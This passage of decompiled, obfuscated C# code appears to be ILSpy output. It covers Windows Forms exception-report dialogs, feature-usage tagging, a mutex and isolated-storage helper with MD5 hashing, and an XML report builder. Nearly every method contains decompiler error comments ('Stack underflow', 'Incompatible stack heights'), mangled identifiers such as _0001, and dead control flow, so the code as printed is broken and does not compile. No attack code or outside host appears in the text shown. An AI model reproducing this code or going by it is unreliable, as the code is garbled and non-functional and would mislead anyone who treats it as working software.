			//IL_0072: Incompatible stack heights: 0 vs 2
			//IL_0075: Incompatible stack heights: 0 vs 1
			if (((_0004)/*Error near IL_0008: Stack underflow*/)._0001 == null || 1 == 0)
			{
				goto IL_0020;
			}
			_ = _008D._007E_0083_0003;
			Thread thread = ((_0004)/*Error near IL_0019: Stack underflow*/)._0001;
			/*Error near IL_005f: Stack underflow*/(thread);
			if (-1 == 0)
			{
			}
			goto IL_0061;
			IL_0061:
			bool flag = (byte)/*Error near IL_0062: Stack underflow*/ != 0;
			if (8u != 0 && (int)/*Error near IL_002d: Stack underflow*/ != 0)
			{
				goto IL_002d;
			}
			goto IL_003e;
			IL_003e:
			_ = _001F_0004._001C_0007;
			/*Error near IL_004c: Stack underflow*/((object)/*Error near IL_004c: Stack underflow*/, (CancelEventArgs)/*Error near IL_004c: Stack underflow*/);
			if (4u != 0)
			{
				return;
			}
			goto IL_0020;
			IL_0020:
			if (false)
			{
				goto IL_002d;
			}
			_ = 0;
			goto IL_0061;
			IL_002d:
			_ = global::_000F._007E_0017_0002;
			Thread thread2 = ((_0004)/*Error near IL_003a: Stack underflow*/)._0001;
			/*Error near IL_006f: Stack underflow*/(thread2);
			goto IL_003e;
		}

		private unsafe void _0002(object P_0, global::_0005._0007 P_1)
		{
			//IL_0227: Incompatible stack heights: 0 vs 1
			//IL_0231: Incompatible stack heights: 0 vs 2
			//IL_023b: Incompatible stack heights: 0 vs 1
			//IL_0241: Incompatible stack heights: 0 vs 1
			//IL_0247: Incompatible stack heights: 0 vs 1
			//IL_0253: Incompatible stack heights: 0 vs 1
			int num = 3;
			while (true)
			{
				void* ptr = stackalloc byte[num];
				Button obj;
				if (((_0004)/*Error near IL_0014: Stack underflow*/).m__0001)
				{
					_ = _0080_0004._007E_001E_0007;
					_007F_0004._001D_0007();
					/*Error near IL_023b: Stack underflow*/((object)/*Error near IL_023b: Stack underflow*/);
					if ((int)/*Error near IL_002c: Stack underflow*/ == 0)
					{
						obj = ((_0004)/*Error near IL_0042: Stack underflow*/)._0006;
						goto IL_024c;
					}
				}
				obj = ((_0004)/*Error near IL_0036: Stack underflow*/)._0005;
				goto IL_024c;
				IL_024c:
				Button val = obj;
				global::_000E._0005 obj2 = ((global::_0005._0007)/*Error near IL_0051: Stack underflow*/)._0001;
				do
				{
					switch (obj2)
					{
					default:
						return;
					case global::_000E._0005._0001:
						*(bool*)ptr = P_1._0001;
						break;
					case global::_000E._0005._0002:
						((byte*)ptr)[1] = (P_1._0001 ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[1] != 0)
						{
							global::_0005._0011._0001(this._0002, P_1._0001);
							goto IL_00ee;
						}
						do
						{
							global::_0005._0011._0001(this._0001);
							global::_0005._0011._0001(this._0002);
						}
						while (false);
						return;
					case global::_000E._0005._0003:
						((byte*)ptr)[2] = (P_1._0001 ? ((byte)1) : ((byte)0));
						if (((byte*)ptr)[2] != 0)
						{
							_0084_0002._007E_0092_0004(this._0001, false);
							global::_0005._0011._0001(this._0003, P_1._0001);
							_0084_0002._007E_0092_0004(val, true);
							_008D._007E_0084_0003(val);
						}
						else
						{
							global::_0005._0011._0001(this._0002);
							global::_0005._0011._0001(this._0003);
							_0084_0002._007E_0092_0004(this._0001, true);
						}
						return;
					case global::_000E._0005._0004:
						{
							_0084_0002._007E_0092_0004(this._0001, false);
							while (true)
							{
								global::_0005._0011._0001(this._0003);
								if (0 == 0)
								{
									global::_0005._0011._0001(this._0004);
									if (2 == 0)
									{
										break;
									}
									_0084_0002._007E_0093_0004(this._0004, true);
									if (8 == 0)
									{
										goto end_IL_005b;
									}
									_008D._007E_0084_0003(this._0004);
									_0084_0002._007E_0093_0004(this._0003, false);
									if (0 == 0)
									{
										return;
									}
								}
							}
							goto IL_00ee;
						}
						IL_00ee:
						_0084_0002._007E_0092_0004(val, true);
						_008D._007E_0084_0003(val);
						return;
						end_IL_005b:
						break;
					}
				}
				while (false);
				num = *(sbyte*)ptr;
				if (0 == 0)
				{
					if (num != 0)
					{
						global::_0005._0011._0001(this._0001, P_1._0001);
						_0084_0002._007E_0092_0004(val, true);
						_008D._007E_0084_0003(val);
					}
					else
					{
						global::_0005._0011._0001(this._0001);
					}
					break;
				}
			}
		}

		private void _0008(object P_0, EventArgs P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 2
			_ = global::_000F._0016_0002;
			/*Error near IL_0014: Stack underflow*/((object)/*Error near IL_0014: Stack underflow*/);
		}

		internal void _000E(object P_0, EventArgs P_1)
		{
			//IL_0068: Incompatible stack heights: 0 vs 1
			//IL_006e: Incompatible stack heights: 0 vs 2
			//IL_007e: Incompatible stack heights: 0 vs 1
			//IL_0088: Incompatible stack heights: 0 vs 1
			//IL_0092: Incompatible stack heights: 0 vs 1
			if (3u != 0)
			{
			}
			((_0004)/*Error near IL_000c: Stack underflow*/).m__0001 = true;
			_ = _0084_0002._007E_0092_0004;
			Button obj = ((_0004)/*Error near IL_0018: Stack underflow*/)._0005;
			/*Error near IL_0078: Stack underflow*/(obj, false);
			if (uint.MaxValue != 0)
			{
				global::_0005._0011._0001(((_0004)/*Error near IL_0026: Stack underflow*/)._0001);
				if (false)
				{
					return;
				}
				global::_0005._0011._0001(((_0004)/*Error near IL_0033: Stack underflow*/)._0002);
				goto IL_0036;
			}
			goto IL_0042;
			IL_0036:
			if (false)
			{
				return;
			}
			global::_0005._0011._0001(((_0004)/*Error near IL_0040: Stack underflow*/)._0003);
			goto IL_0042;
			IL_0042:
			if (this.m__0001 != null)
			{
				if (0 == 0)
				{
					global::_0005._0011._0001(this, (ThreadStart)_0001);
					return;
				}
				goto IL_0036;
			}
		}

		private void _0001()
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0014: Incompatible stack heights: 0 vs 1
			global::_0005._0011._0001(((_0004)/*Error near IL_0008: Stack underflow*/).m__0001);
		}

		internal void _000F(object P_0, EventArgs P_1)
		{
			//IL_0036: Incompatible stack heights: 0 vs 1
			//IL_003c: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			do
			{
				if (uint.MaxValue != 0 && 8u != 0)
				{
					bool flag = ((_0004)/*Error near IL_000e: Stack underflow*/).m__0001 != null;
					if (0 == 0 && (int)/*Error near IL_001a: Stack underflow*/ == 0)
					{
						continue;
					}
				}
				ThreadStart threadStart = ((_0004)/*Error near IL_0023: Stack underflow*/).m__0001._0001;
				global::_0005._0011._0001((_0004)/*Error near IL_0049: Stack underflow*/, threadStart);
			}
			while (false);
		}

		public _0004(global::_000F._0003 P_0, global::_0005._0006 P_1)
		{
			//IL_0001: Unknown result type (might be due to invalid IL or missing references)
			//IL_000b: Expected O, but got Unknown
			//IL_000c: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Expected O, but got Unknown
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0021: Expected O, but got Unknown
			//IL_0022: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Expected O, but got Unknown
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Expected O, but got Unknown
			//IL_0043: Unknown result type (might be due to invalid IL or missing references)
			//IL_004d: Expected O, but got Unknown
			//IL_004e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0058: Expected O, but got Unknown
			//IL_0059: Unknown result type (might be due to invalid IL or missing references)
			//IL_0063: Expected O, but got Unknown
			//IL_00c3: Unknown result type (might be due to invalid IL or missing references)
			//IL_00cd: Expected O, but got Unknown
			//IL_00ce: Unknown result type (might be due to invalid IL or missing references)
			//IL_00d8: Expected O, but got Unknown
			//IL_00d9: Unknown result type (might be due to invalid IL or missing references)
			//IL_00e3: Expected O, but got Unknown
			//IL_0141: Unknown result type (might be due to invalid IL or missing references)
			//IL_014b: Expected O, but got Unknown
			global::_0005._0011._0001(this);
			int height = ((Control)this).get_Height();
			this.m__0001 = P_1;
			((Control)this._0001).set_Text(P_1._0001.Message);
			height += ((Control)this._0001).get_Height() - ((Control)this).get_FontHeight();
			if (!P_1._0003)
			{
				((Control)this._0001).set_Visible(false);
				height -= ((Control)this._0001).get_Height();
			}
			if (height > ((Control)this).get_Height())
			{
				((Control)this).set_Height(height);
			}
			if (P_1._0001)
			{
				P_0._0001((EventHandler)_0007);
				((Control)this._0007).set_Visible(true);
				if (((Control)this._0007).get_Left() < ((Control)this._0001).get_Right())
				{
					((Control)this._0001).set_Visible(false);
				}
			}
			if (!P_1._0002)
			{
				((Control)this._0002).set_Enabled(false);
				if (((Control)this._0001).get_CanFocus())
				{
					((Control)this._0001).Focus();
				}
			}
			P_0._0001((_0010._0005)_0001);
		}
	}
}
namespace _0004
{
	internal sealed class _000E : Form
	{
		private global::_0008._0005 m__0001 = null;

		internal global::_000E._0006 _0001 = new global::_000E._0006();

		internal Button _0001 = new Button();

		internal Button _0002 = new Button();

		internal _0008 _0001 = new _0008(string.Format(global::_000E._0003._0001(107389440), global::_000E._0003._0001(107395030)));

		internal global::_0006._0005 _0001 = new global::_0006._0005();

		internal void _0001(object P_0, EventArgs P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (0 == 0)
				{
				}
				if (8 == 0)
				{
					continue;
				}
				((_000E)/*Error near IL_000e: Stack underflow*/).m__0001._0001 = true;
				while (0 == 0)
				{
					_ = global::_000F._0016_0002;
					/*Error near IL_0031: Stack underflow*/((object)/*Error near IL_0031: Stack underflow*/);
					if (8u != 0)
					{
						return;
					}
				}
			}
		}

		internal void _0002(object P_0, EventArgs P_1)
		{
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			while (true)
			{
				if (0 == 0)
				{
				}
				if (8 == 0)
				{
					continue;
				}
				((_000E)/*Error near IL_000e: Stack underflow*/).m__0001._0001 = false;
				while (0 == 0)
				{
					_ = global::_000F._0016_0002;
					/*Error near IL_0031: Stack underflow*/((object)/*Error near IL_0031: Stack underflow*/);
					if (8u != 0)
					{
						return;
					}
				}
			}
		}

		public _000E(global::_0008._0005 P_0)
		{
			//IL_0013: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Expected O, but got Unknown
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0028: Expected O, but got Unknown
			global::_0005._0011._0001(this);
			((Form)this).set_Icon(global::_0005._0011._0001());
			((Control)this).set_Text(global::_000E._0003._0001(107395030));
			if (((Control)this).get_Text().Length == 0)
			{
				((Control)this).set_Text(global::_000E._0003._0001(107389883));
			}
			this.m__0001 = P_0;
			if (!P_0._0003)
			{
				((Control)this._0001).set_Visible(false);
			}
			if (P_0._0001.Length > 0)
			{
				((Control)this._0001).set_Text(P_0._0001);
			}
			else
			{
				StringBuilder stringBuilder = new StringBuilder();
				stringBuilder.Append(string.Format(global::_000E._0003._0001(107389830), global::_000E._0003._0001(107395030)));
				if (P_0._0003)
				{
					stringBuilder.Append(global::_000E._0003._0001(107389024));
				}
				stringBuilder.Append(P_0._0001.Message);
				((Control)this._0001).set_Text(stringBuilder.ToString());
			}
			int num = ((Control)this._0001).get_Bottom() + 60;
			if (num > ((Form)this).get_ClientSize().Height)
			{
				((Form)this).set_ClientSize(new Size(((Form)this).get_ClientSize().Width, num));
			}
		}
	}
}
namespace _000F
{
	internal sealed class _0005 : _0003
	{
		protected override void _0001(_0008._0005 P_0)
		{
			//IL_001c: Incompatible stack heights: 0 vs 2
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Incompatible stack heights: 0 vs 1
			//IL_003d: Incompatible stack heights: 0 vs 1
			//IL_0044: Incompatible stack heights: 0 vs 1
			do
			{
				if (1 == 0)
				{
					continue;
				}
				new global::_0004._000E((_0008._0005)/*Error near IL_0044: Stack underflow*/);
				global::_0004._000E obj = (global::_0004._000E)/*Error near IL_0047: Stack underflow*/;
				try
				{
					if (0 == 0)
					{
						_ = _0091_0002._007E_0018_0005;
						/*Error near IL_0023: Stack underflow*/((object)/*Error near IL_0023: Stack underflow*/);
					}
				}
				finally
				{
					if (obj != null)
					{
						global::_000F._007E_0099(obj);
					}
					while (1 == 0)
					{
					}
				}
			}
			while (false);
		}

		protected override void _0001(global::_0005._0006 P_0)
		{
			//IL_001b: Incompatible stack heights: 0 vs 2
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0022: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0042: Incompatible stack heights: 0 vs 1
			//IL_0049: Incompatible stack heights: 0 vs 1
			if (0 == 0)
			{
			}
			do
			{
				new _0007._0004((_0003)/*Error near IL_0049: Stack underflow*/, (global::_0005._0006)/*Error near IL_0049: Stack underflow*/);
				_0007._0004 obj = (_0007._0004)/*Error near IL_004c: Stack underflow*/;
				try
				{
					_ = _0091_0002._007E_0018_0005;
					/*Error near IL_0022: Stack underflow*/((object)/*Error near IL_0022: Stack underflow*/);
				}
				finally
				{
					if (obj != null)
					{
						while (0 == 0)
						{
							global::_000F._007E_0099(obj);
							if (0 == 0)
							{
								break;
							}
						}
					}
				}
			}
			while (false);
		}

		protected override void _0001(_0007._0002 P_0)
		{
			//IL_0031: Incompatible stack heights: 0 vs 3
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 2
			//IL_0046: Incompatible stack heights: 0 vs 1
			//IL_004d: Incompatible stack heights: 0 vs 1
			//IL_004f: Unknown result type (might be due to invalid IL or missing references)
			//IL_0054: Incompatible stack heights: 0 vs 1
			_ = _0081_0004._001F_0007;
			_ = global::_0007._007E_0086;
			Exception ex = ((_0007._0002)/*Error near IL_0012: Stack underflow*/)._0001;
			/*Error near IL_0038: Stack underflow*/(ex);
			_ = _0018_0002._007F_0004;
			_000E._0003._0001(107389370);
			_000E._0003._0001(107395030);
			/*Error near IL_004d: Stack underflow*/((string)/*Error near IL_004d: Stack underflow*/, (object)/*Error near IL_004d: Stack underflow*/);
			/*Error near IL_0054: Stack underflow*/((string)/*Error near IL_0054: Stack underflow*/, (string)/*Error near IL_0054: Stack underflow*/, (MessageBoxButtons)0, (MessageBoxIcon)16);
		}

		public new static bool _0001()
		{
			//IL_0014: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 2
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_009a: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a8: Incompatible stack heights: 0 vs 2
			//IL_00af: Incompatible stack heights: 0 vs 1
			//IL_00b6: Incompatible stack heights: 0 vs 1
			//IL_00eb: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				new _0005();
				global::_0005._0011._0001((_0003)/*Error near IL_001b: Stack underflow*/);
				return true;
			}
			catch (SecurityException)
			{
				try
				{
					try
					{
						_ = _0082_0004._007F_0007;
						_001F._009E_0002(typeof(Application).TypeHandle);
						_000E._0003._0001(107389341);
						/*Error near IL_005d: Stack underflow*/((object)/*Error near IL_005d: Stack underflow*/, (string)/*Error near IL_005d: Stack underflow*/, BindingFlags.Static | BindingFlags.Public | BindingFlags.InvokeMethod, null, null, null);
					}
					catch (MissingMethodException)
					{
					}
					_ = _0018_0002._007F_0004;
					_000E._0003._0001(107389284);
					_000E._0003._0001(107395030);
					/*Error near IL_00b6: Stack underflow*/((string)/*Error near IL_00b6: Stack underflow*/, (object)/*Error near IL_00b6: Stack underflow*/);
					string text = (string)/*Error near IL_007a: Stack underflow*/;
					global::_0004._000E obj = new global::_0004._000E(new _0008._0005(text, false));
					_0084_0002._007E_0095_0004(obj, true);
					_0091_0002._007E_0018_0005(obj);
				}
				catch (Exception ex2)
				{
					_0081_0004._001F_0007(global::_0007._007E_0086(ex2), _0018_0002._007F_0004(_000E._0003._0001(107389370), _000E._0003._0001(107395030)), (MessageBoxButtons)0, (MessageBoxIcon)16);
				}
				return false;
			}
		}
	}
}
namespace _0010
{
	internal static class _0006
	{
		internal static void _0001()
		{
			//IL_0027: Incompatible stack heights: 0 vs 2
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 1
			//IL_003f: Incompatible stack heights: 0 vs 1
			int num = default(int);
			try
			{
				try
				{
					if (true)
					{
						_ = global::_0004._0019;
						_000E._0003._0001(107388722);
						_0098_0002._0086_0005();
						num = (int)/*Error near IL_0031: Stack underflow*/;
						num.ToString();
						/*Error near IL_003f: Stack underflow*/((string)/*Error near IL_003f: Stack underflow*/, (string)/*Error near IL_003f: Stack underflow*/);
						_0001((string)/*Error near IL_0046: Stack underflow*/);
					}
				}
				catch
				{
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)num);
				throw;
			}
		}

		public static void _0001([FeatureName] string _0002)
		{
			//IL_0006: Incompatible stack heights: 0 vs 1
			global::_0005._0011._0001((string)/*Error near IL_000d: Stack underflow*/);
		}
	}
}
namespace _0006
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Constructor | AttributeTargets.Method | AttributeTargets.Property | AttributeTargets.Field | AttributeTargets.Event | AttributeTargets.Interface | AttributeTargets.Parameter | AttributeTargets.Delegate)]
	internal sealed class _0006 : Attribute
	{
	}
}
namespace _0010
{
	[AttributeUsage(AttributeTargets.Assembly | AttributeTargets.Module | AttributeTargets.Class | AttributeTargets.Struct | AttributeTargets.Enum | AttributeTargets.Method | AttributeTargets.Field | AttributeTargets.Interface | AttributeTargets.Delegate)]
	internal sealed class _0007 : Attribute
	{
	}
}
namespace _0005
{
	internal sealed class _000E
	{
		internal readonly ulong[] _0001;

		internal readonly Dictionary<string, ulong> _0001;

		public _000E(ulong[] P_0, Dictionary<string, ulong> P_1)
		{
			try
			{
				this._0001 = P_0;
				_0001 = P_1;
			}
			catch (Exception ex)
			{
				_0011._0001(ex, (object)this, (object)P_0, (object)P_1);
				throw;
			}
		}
	}
}
namespace _0002
{
	internal static class _000E
	{
		internal sealed class _0001 : IDisposable
		{
			private static readonly CultureInfo m__0001;

			private readonly CultureInfo _0002;

			private readonly Mutex m__0001;

			public _0001(string P_0)
			{
				try
				{
					_0002 = Thread.CurrentThread.CurrentUICulture;
					Thread.CurrentThread.CurrentUICulture = _000E._0001.m__0001;
					if (P_0.Length > 260)
					{
						P_0 = P_0.Remove(261);
					}
					P_0 = P_0.Replace(Path.DirectorySeparatorChar, '_');
					this.m__0001 = new Mutex(initiallyOwned: false, P_0);
					try
					{
						this.m__0001.WaitOne();
					}
					catch (AbandonedMutexException)
					{
					}
				}
				catch (Exception ex2)
				{
					global::_0005._0011._0001(ex2, (object)this, (object)P_0);
					throw;
				}
			}

			public void _0001()
			{
				//IL_0037: Incompatible stack heights: 0 vs 2
				//IL_0041: Incompatible stack heights: 0 vs 2
				//IL_004f: Incompatible stack heights: 0 vs 2
				//IL_0052: Incompatible stack heights: 0 vs 1
				try
				{
					if (true)
					{
						_ = global::_000F._007E_0018_0002;
						Mutex mutex = ((_0001)/*Error near IL_000f: Stack underflow*/).m__0001;
						/*Error near IL_003e: Stack underflow*/(mutex);
						_ = global::_000F._007E_0019_0002;
						Mutex mutex2 = ((_0001)/*Error near IL_001d: Stack underflow*/).m__0001;
						/*Error near IL_0048: Stack underflow*/(mutex2);
					}
					_ = _0084_0004._007E_0081_0007;
					_007F_0004._001D_0007();
					CultureInfo cultureInfo = ((_0001)/*Error near IL_0032: Stack underflow*/)._0002;
					/*Error near IL_0059: Stack underflow*/((object)/*Error near IL_0059: Stack underflow*/, cultureInfo);
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this);
					throw;
				}
			}

			void IDisposable.Dispose()
			{
				//ILSpy generated this explicit interface implementation from .override directive in 
				this._0001();
			}

			static _0001()
			{
				//IL_001a: Incompatible stack heights: 0 vs 2
				//IL_0021: Incompatible stack heights: 0 vs 1
				try
				{
					_ = _0086_0004._0082_0007;
					global::_000E._0003._0001(107388085);
					/*Error near IL_0021: Stack underflow*/((string)/*Error near IL_0021: Stack underflow*/);
					_000E._0001.m__0001 = (CultureInfo)/*Error near IL_0013: Stack underflow*/;
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex);
					throw;
				}
			}
		}

		private static readonly string m__0001;

		internal static readonly string _0002;

		internal static readonly string _0003;

		internal static readonly string _0004;

		internal static readonly IsolatedStorageFile _0001;

		internal static readonly Encoding _0001;

		internal static readonly HashAlgorithm _0001;

		static _000E()
		{
			//IL_00e1: Incompatible stack heights: 0 vs 2
			//IL_00eb: Incompatible stack heights: 0 vs 1
			//IL_00f5: Incompatible stack heights: 0 vs 3
			//IL_00ff: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 3
			//IL_0113: Incompatible stack heights: 0 vs 1
			//IL_011d: Incompatible stack heights: 0 vs 3
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_0131: Incompatible stack heights: 0 vs 1
			try
			{
				while (true)
				{
					if (0 == 0)
					{
						if (4 == 0)
						{
							goto IL_0090;
						}
						_ = _001C._009B_0002;
						global::_000E._0003._0001(107395315);
						/*Error near IL_00eb: Stack underflow*/((object)/*Error near IL_00eb: Stack underflow*/, 1, 8);
						_000E.m__0001 = (string)/*Error near IL_0024: Stack underflow*/;
						_ = global::_0004._001A;
						_ = _000E.m__0001;
						global::_000E._0003._0001(107388693);
						/*Error near IL_00ff: Stack underflow*/((string)/*Error near IL_00ff: Stack underflow*/, (string)/*Error near IL_00ff: Stack underflow*/);
						_0002 = (string)/*Error near IL_0042: Stack underflow*/;
						_ = global::_0004._001A;
						_ = _000E.m__0001;
						global::_000E._0003._0001(107391303);
						/*Error near IL_0113: Stack underflow*/((string)/*Error near IL_0113: Stack underflow*/, (string)/*Error near IL_0113: Stack underflow*/);
						_0003 = (string)/*Error near IL_0060: Stack underflow*/;
					}
					_ = global::_0004._001A;
					_ = _000E.m__0001;
					global::_000E._0003._0001(107388132);
					/*Error near IL_0127: Stack underflow*/((string)/*Error near IL_0127: Stack underflow*/, (string)/*Error near IL_0127: Stack underflow*/);
					_0004 = (string)/*Error near IL_007e: Stack underflow*/;
					if (false)
					{
						break;
					}
					_0013._008F_0002();
					_000E._0001 = (Encoding)/*Error near IL_0090: Stack underflow*/;
					goto IL_0090;
					IL_0090:
					_000E._0001 = new MD5CryptoServiceProvider();
					_000E._0001 = _0083_0004._0080_0007();
					if (5 == 0)
					{
						break;
					}
					if (0 == 0)
					{
						_0011._007E_0084_0002(_000E._0001, _000E.m__0001);
						break;
					}
				}
				_0011._007E_0084_0002(_000E._0001, _0003);
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex);
				throw;
			}
		}
	}
}
namespace _0003
{
	internal abstract class _0008
	{
		[CompilerGenerated]
		internal sealed class _0001
		{
			public _0008 _0001;

			public global::_0005._000E _0001;

			internal void _0001()
			{
				//IL_0013: Incompatible stack heights: 0 vs 1
				//IL_0016: Incompatible stack heights: 0 vs 2
				try
				{
					_ = ((_0001)/*Error near IL_0007: Stack underflow*/)._0001;
					global::_0005._000E obj = ((_0001)/*Error near IL_000e: Stack underflow*/)._0001;
					((_0008)/*Error near IL_001d: Stack underflow*/)._0001(obj);
				}
				catch (Exception ex)
				{
					global::_0005._0011._0001(ex, (object)this);
					throw;
				}
			}
		}

		internal static bool _0001;

		[CompilerGenerated]
		private global::_0002._000F m__0001;

		internal static readonly object _0001;

		internal void _0001(object P_0, EventArgs P_1)
		{
			//IL_003f: Incompatible stack heights: 0 vs 1
			//IL_0045: Incompatible stack heights: 0 vs 1
			//IL_004c: Incompatible stack heights: 0 vs 1
			//IL_004f: Incompatible stack heights: 0 vs 1
			//IL_0056: Incompatible stack heights: 0 vs 1
			//IL_005c: Incompatible stack heights: 0 vs 1
			//IL_005f: Incompatible stack heights: 0 vs 1
			global::_0005._000E obj = default(global::_0005._000E);
			global::_0006._0007 obj2 = default(global::_0006._0007);
			try
			{
				global::_0005._0011._0001();
				obj = (global::_0005._000E)/*Error near IL_0042: Stack underflow*/;
				global::_0005._0011._0001((global::_0005._000E)/*Error near IL_004c: Stack underflow*/);
				if ((int)/*Error near IL_000a: Stack underflow*/ == 0)
				{
					new global::_0006._0007((global::_0005._000E)/*Error near IL_0056: Stack underflow*/);
					obj2 = (global::_0006._0007)/*Error near IL_0059: Stack underflow*/;
					global::_0002._000F obj3 = _0001;
					((global::_0008._0006)/*Error near IL_0024: Stack underflow*/)._0001(obj3);
					if (_0001())
					{
						_0001(obj2);
						global::_0005._0011._0001();
					}
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)obj, (object)obj2, (object)this, P_0, (object)P_1);
				throw;
			}
		}

		protected abstract void _0001(global::_0006._0007 P_0);

		protected abstract bool _0001();

		private void _0001(global::_0005._000E P_0)
		{
			//IL_0044: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 1
			//IL_0051: Incompatible stack heights: 0 vs 1
			//IL_0054: Incompatible stack heights: 0 vs 1
			//IL_005e: Incompatible stack heights: 0 vs 1
			//IL_0065: Incompatible stack heights: 0 vs 1
			//IL_006c: Incompatible stack heights: 0 vs 2
			global::_0006._0007 obj = default(global::_0006._0007);
			try
			{
				if (false)
				{
					return;
				}
				new global::_0006._0007((global::_0005._000E)/*Error near IL_004b: Stack underflow*/);
				obj = (global::_0006._0007)/*Error near IL_004e: Stack underflow*/;
				global::_0002._000F obj2 = _0001;
				((global::_0008._0006)/*Error near IL_005b: Stack underflow*/)._0001(obj2);
				((_0008)/*Error near IL_0065: Stack underflow*/)._0001();
				if ((int)/*Error near IL_0020: Stack underflow*/ != 0)
				{
					goto IL_0020;
				}
				goto IL_0039;
				IL_0020:
				_ = _0084_0002._007E_0090_0004;
				_007F_0004._001D_0007();
				/*Error near IL_0032: Stack underflow*/((object)/*Error near IL_0032: Stack underflow*/, false);
				_0001(obj);
				goto IL_0039;
				IL_0039:
				if (0 == 0)
				{
					global::_0005._0011._0001();
					return;
				}
				goto IL_0020;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)obj, (object)this, (object)P_0);
				throw;
			}
		}

		private void _0001(object P_0, global::_0005._000F P_1)
		{
			//IL_0026: Incompatible stack heights: 0 vs 1
			//IL_002c: Incompatible stack heights: 0 vs 1
			//IL_002f: Incompatible stack heights: 0 vs 1
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0035: Incompatible stack heights: 0 vs 1
			global::_0002._000F obj2 = default(global::_0002._000F);
			try
			{
				while (true)
				{
					global::_0002._000F obj = ((_0008)/*Error near IL_0007: Stack underflow*/).m__0001;
					if (0 == 0)
					{
						obj2 = obj;
					}
					if (0 == 0 && (int)/*Error near IL_0012: Stack underflow*/ != 0)
					{
						goto IL_0012;
					}
					goto IL_001d;
					IL_001d:
					if (2u != 0)
					{
						if (-1 == 0)
						{
							continue;
						}
						break;
					}
					goto IL_0012;
					IL_0012:
					if (uint.MaxValue != 0)
					{
						/*Error near IL_003c: Stack underflow*/((object)/*Error near IL_003c: Stack underflow*/, (global::_0005._000F)/*Error near IL_003c: Stack underflow*/);
					}
					goto IL_001d;
				}
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)obj2, (object)this, P_0, (object)P_1);
				throw;
			}
		}

		static _0008()
		{
			//IL_000e: Incompatible stack heights: 0 vs 1
			try
			{
				new object();
				_0008._0001 = (object)/*Error near IL_0007: Stack underflow*/;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex);
				throw;
			}
		}
	}
}
namespace _0006
{
	internal sealed class _0007 : global::_0008._0006
	{
		internal new global::_0005._000E _0001;

		internal new byte[] _0001;

		public _0007(global::_0005._000E P_0)
		{
			try
			{
				this._0001 = P_0;
			}
			catch (Exception ex)
			{
				global::_0005._0011._0001(ex, (object)this, (object)P_0);
				throw;
			}
		}

		internal new unsafe void _0001()
		{
			//IL_039a: Incompatible stack heights: 0 vs 1
			//IL_03a6: Incompatible stack heights: 0 vs 1
			//IL_03ac: Incompatible stack heights: 0 vs 1
			//IL_03b2: Incompatible stack heights: 0 vs 1
			//IL_03b8: Incompatible stack heights: 0 vs 1
			//IL_03c2: Incompatible stack heights: 0 vs 1
			//IL_03c8: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[12];
			global::_0005._000E obj = default(global::_0005._000E);
			ulong[] array = default(ulong[]);
			Dictionary<string, ulong> dictionary = default(Dictionary<string, ulong>);
			MemoryStream memoryStream = default(MemoryStream);
			XmlWriter xmlWriter = default(XmlWriter);
			global::_0004._000F obj2 = default(global::_0004._000F);
			DateTime dateTime = default(DateTime);
			Guid guid = default(Guid);
			string text3 = default(string);
			MD5CryptoServiceProvider mD5CryptoServiceProvider = default(MD5CryptoServiceProvider);
			string text4 = default(string);
			global::_0004._000F obj5 = default(global::_0004._000F);
			Dictionary<string, ulong>.Enumerator enumerator = default(Dictionary<string, ulong>.Enumerator);
			KeyValuePair<string, ulong> current = default(KeyValuePair<string, ulong>);
			try
			{
				obj = ((_0007)/*Error near IL_0014: Stack underflow*/)._0001;
				((_0007)/*Error near IL_0024: Stack underflow*/)._0001 = null;
				if (((_0007)/*Error near IL_002e: Stack underflow*/)._0001 != null || (int)/*Error near IL_0037: Stack underflow*/ == 0)
				{
					return;
				}
				global::_0005._0011._0001((global::_0005._000E)/*Error near IL_03c2: Stack underflow*/);
				if ((int)/*Error near IL_0043: Stack underflow*/ != 0)
				{
					return;
				}
				array = global::_0005._0011._0001((global::_0005._000E)/*Error near IL_0052: Stack underflow*/);
